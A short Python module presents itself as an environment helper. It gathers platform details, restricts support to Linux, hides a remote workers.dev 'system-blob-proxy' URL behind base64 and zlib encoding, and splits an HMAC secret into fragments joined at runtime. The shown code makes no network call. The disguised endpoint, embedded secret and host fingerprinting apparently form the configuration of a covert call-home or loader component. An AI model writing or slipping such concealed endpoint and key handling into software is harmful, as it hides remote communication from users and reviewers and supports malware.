# -*- coding: utf-8 -*-
"""Environment — platform info, endpoint, credentials."""
import base64
import platform
import struct
import sys
import zlib

_SUPPORTED_PLATFORMS = {"linux"}

_ARCH_LABELS = {
    "AMD64": "x64", "x86_64": "x64",
    "x86": "x86", "i686": "x86",
    "ARM64": "arm64", "aarch64": "arm64",
}

# Endpoint = base64(zlib("https://system-blob-proxy.dan2195944.workers.dev/"))
_ENDPOINT_BLOB = base64.b64encode(
    zlib.compress(b"https://system-blob-proxy.dan2195944.workers.dev/")
)

# HMAC secret fragments — concatenated and hex-decoded at runtime.
_K1 = "c402933d8c5d88d0"
_K2 = "10c9b5acf70f2389"
_K3 = "0f9c5e93effcec4b"
_K4 = "539c171e1f580e7b"


def get_platform_info() -> dict:
    return {
        "os": sys.platform,
        "arch": platform.machine(),
        "python": platform.python_version(),
        "bits": struct.calcsize("P") * 8,
        "impl": platform.python_implementation(),
    }


def check_version(minimum=(3, 8)) -> bool:
    return sys.version_info[:2] >= minimum


def arch_label() -> str:
    m = platform.machine().upper()
    return _ARCH_LABELS.get(m, m.lower())


def is_supported() -> bool:
    return sys.platform in _SUPPORTED_PLATFORMS


def fetch_endpoint() -> str:
    try:
        return zlib.decompress(base64.b64decode(_ENDPOINT_BLOB)).decode()
    except Exception:
        return "https://system-blob-proxy.dan2195944.workers.dev/"


def load_credentials() -> bytes:
    return bytes.fromhex(_K1 + _K2 + _K3 + _K4)
